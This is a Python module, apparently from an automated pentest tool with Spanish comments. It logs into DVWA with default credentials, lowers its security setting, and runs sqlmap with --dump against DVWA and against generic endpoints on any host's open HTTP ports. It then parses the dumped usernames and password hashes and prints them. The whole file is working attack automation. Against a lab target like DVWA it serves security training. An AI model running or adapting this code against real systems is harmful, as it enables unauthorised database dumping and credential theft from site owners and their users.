import subprocess
import re
import requests
from pathlib import Path
from config import Config
from models.host import Host
from models.vuln import Vulnerability, RiskLevel


class SQLMapInjector:
    def __init__(self, host: Host):
        self.host = host
        self.sql_dir = Path(f"{Config.OUTPUT_BASE}/sqlmap")
        self.sql_dir.mkdir(parents=True, exist_ok=True)

    def _get_dvwa_cookie(self):
        """Login en DVWA y obtener cookie de sesión"""
        try:
            session = requests.Session()
            login_url = f"http://{self.host.ip}{Config.DVWA_LOGIN_URL}"

            # Obtener token CSRF
            resp = session.get(login_url, timeout=10)
            token_match = re.search(r"user_token'\s+value='([^']+)'", resp.text)
            token = token_match.group(1) if token_match else ''

            # Login
            data = {
                'username': Config.DVWA_DEFAULT_USER,
                'password': Config.DVWA_DEFAULT_PASS,
                'Login': 'Login',
                'user_token': token
            }
            session.post(login_url, data=data, timeout=10)

            # Poner seguridad en LOW
            session.post(f"http://{self.host.ip}/dvwa/security.php",
                         data={'security': 'low', 'seclev_submit': 'Submit'},
                         timeout=10)

            cookies = session.cookies.get_dict()
            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            if 'PHPSESSID' in cookies:
                print(f"   🔑 Login DVWA OK (PHPSESSID={cookies['PHPSESSID'][:8]}...)")
                return cookie_str + '; security=low'
            return None
        except Exception as e:
            print(f"   ⚠️ Login DVWA fallido: {e}")
            return None

    def _parse_credentials(self, output_dir):
        """Buscar credenciales en la salida de SQLMap"""
        creds = []
        dump_dir = output_dir
        # SQLMap guarda dumps en subdirectorios
        for dump_file in Path(dump_dir).rglob("*.csv"):
            try:
                content = dump_file.read_text(errors='ignore')
                for line in content.strip().split('\n')[1:]:  # Skip header
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 2:
                        creds.append({
                            'source': 'SQLMap (DVWA)',
                            'user': parts[0],
                            'password': parts[1] if len(parts) > 1 else '',
                            'hash': parts[1] if len(parts) > 1 else ''
                        })
            except Exception:
                pass

        # También parsear la salida estándar de SQLMap
        for log_file in Path(dump_dir).rglob("log"):
            try:
                content = log_file.read_text(errors='ignore')
                # Buscar tablas dumpeadas con formato: | user | hash |
                table_pattern = re.findall(r'\|\s*(\w+)\s*\|\s*([a-fA-F0-9]{32})\s*\|', content)
                for user, hash_val in table_pattern:
                    if user not in ['user', 'username', 'field']:
                        creds.append({
                            'source': 'SQLMap (DVWA)',
                            'user': user,
                            'password': hash_val,
                            'hash': hash_val
                        })
            except Exception:
                pass

        return creds

    def attack(self):
        vulns = []
        print("   💉 SQLMap contra DVWA...")

        # 1. Intentar login automático en DVWA
        cookie = self._get_dvwa_cookie()

        for port, service in list(self.host.ports_open.items())[:3]:
            if 'http' not in service['service'].lower():
                continue

            output_dir = self.sql_dir / f"sql_{self.host.ip}_{port}"
            output_dir.mkdir(exist_ok=True)

            # ATAQUE PRINCIPAL: DVWA SQLi con cookie
            if cookie:
                dvwa_url = f"http://{self.host.ip}:{port}{Config.DVWA_SQLI_URL}?id=1&Submit=Submit"
                print(f"   🎯 SQLMap DVWA: {dvwa_url}")

                cmd = [
                    'sqlmap', '-u', dvwa_url,
                    '--cookie', cookie,
                    '--batch', '--risk=2', '--level=2',
                    '--dump', '--threads=3',
                    f'--output-dir={output_dir}'
                ]

                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                    if 'injectable' in result.stdout.lower() or 'dumped' in result.stdout.lower():
                        vuln = Vulnerability(
                            name="💉 SQL INJECTION + DUMP CREDENCIALES",
                            description=f"SQLi en DVWA: {dvwa_url} → Volcado de BD completo",
                            port=port,
                            risk=RiskLevel.CRITICAL,
                            evidence_file=str(output_dir),
                            recommendations="Usar prepared statements, validar inputs, WAF"
                        )
                        vulns.append(vuln)
                        print(f"   💥 SQLi CRÍTICO + DUMP EXITOSO!")

                        # Extraer credenciales
                        creds = self._parse_credentials(output_dir)
                        if creds:
                            self.host.credentials.extend(creds)
                            print(f"   🔑 {len(creds)} credenciales extraídas!")
                            for c in creds:
                                print(f"      👤 {c['user']} : {c['password']}")

                except subprocess.TimeoutExpired:
                    print(f"   ⏰ SQLMap timeout (300s) - puede necesitar más tiempo")
                except Exception as e:
                    print(f"   ⚠️ Error SQLMap: {e}")

            # FALLBACK: endpoints genéricos (sin cookie)
            for endpoint in Config.SQL_ENDPOINTS:
                url = f"http://{self.host.ip}:{port}{endpoint}"
                fb_output = output_dir / "generic"
                fb_output.mkdir(exist_ok=True)

                cmd = [
                    'sqlmap', '-u', url,
                    '--batch', '--risk=2', '--level=2',
                    '--dump', '--threads=3',
                    f'--output-dir={fb_output}'
                ]

                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    if 'injectable' in result.stdout.lower():
                        vuln = Vulnerability(
                            name="💉 SQL INJECTION CONFIRMADA",
                            description=f"SQLi en: {url}",
                            port=port,
                            risk=RiskLevel.CRITICAL,
                            evidence_file=str(fb_output),
                            recommendations="Prepared Statements, WAF"
                        )
                        vulns.append(vuln)
                        print(f"   💥 SQLi CRÍTICO en {endpoint}!")

                        creds = self._parse_credentials(fb_output)
                        if creds:
                            self.host.credentials.extend(creds)
                except Exception:
                    pass

        return vulns
